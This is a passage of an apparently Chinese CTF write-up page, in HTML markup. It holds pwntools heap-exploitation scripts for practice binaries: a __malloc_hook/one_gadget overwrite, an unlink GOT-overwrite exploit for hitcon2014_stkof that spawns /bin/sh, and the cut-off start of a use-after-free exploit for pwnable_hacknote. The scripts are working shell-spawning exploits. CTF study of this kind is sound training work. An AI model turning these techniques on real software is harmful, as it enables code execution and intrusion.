class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>one_gadget <span class=\"token operator\">=</span> <span class=\"token number\">0x4526a</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>one_gadget <span class=\"token operator\">+=</span> libcbase</pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>fakechunk <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> <span class=\"token number\">0x23</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'\\0'</span><span class=\"token operator\">*</span><span class=\"token number\">0x13</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>one_gadget<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span>fakechunk<span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x68</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"hitcon2014_stkof\"><a class=\"markdownIt-Anchor\" href=\"#hitcon2014_stkof\">#</a> hitcon2014_stkof</h2>\n<p>unlink</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'stkof'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libdir <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libdir <span class=\"token operator\">+</span> <span class=\"token string\">'libc-2.23.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26478</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x400D31'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'OK\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> e<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">if</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token number\">0x602140</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free_g <span class=\"token operator\">=</span> <span class=\"token number\">0x602018</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>free_g<span class=\"token operator\">-</span>s<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>s<span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>s<span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xa0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\"># 4 -> 1</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x0a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[+] the address of lsm is:%#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"pwnable_hacknote\"><a class=\"markdownIt-Anchor\" href=\"#pwnable_hacknote\">#</a> pwnable_hacknote</h2>\n<p>uaf, double free</p>\n<p>使用一个 0x8（实际占用 0x10，可用空间 0xc）的块来管理用户块。同时有 double free 漏洞。</p>\n<p>利用 uaf，泄露 unsorted bin chunk 的 libc 地址，获得 system 的地址。</p>\n<p>管理块的前 4 字节储存输出函数，后 4 字节储存用户块的地址。调用该输出函数时会以管理块的地址作为参数，由输出函数将其转换成用户块地址。</p>\n<p>将输出函数的地址替换成 system 函数的地址，在其后接入 <code>;sh\\0</code> 。由于管理块首此时为 system 的地址，无法解析，于是可以。</p>\n<p>靶机用的不是平时用的 2.23 的 32 位库，用的一个很神奇的看不懂的库。记录一下。</p>\n<p><img data-src=\"./image-20231110011318078.png\" alt=\"image-20231110011318078\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'hacknote'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libdir <span class=\"token operator\">=</span> <span class=\"token string\">'/mnt/share/pwn/buu/libc/libc6_2.23-0ubuntu10_i386/'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libdir <span class=\"token operator\">+</span> <span class=\"token string\">'libc-2.23.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x08048A33'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'blank\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Note size :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content :'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Index :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td 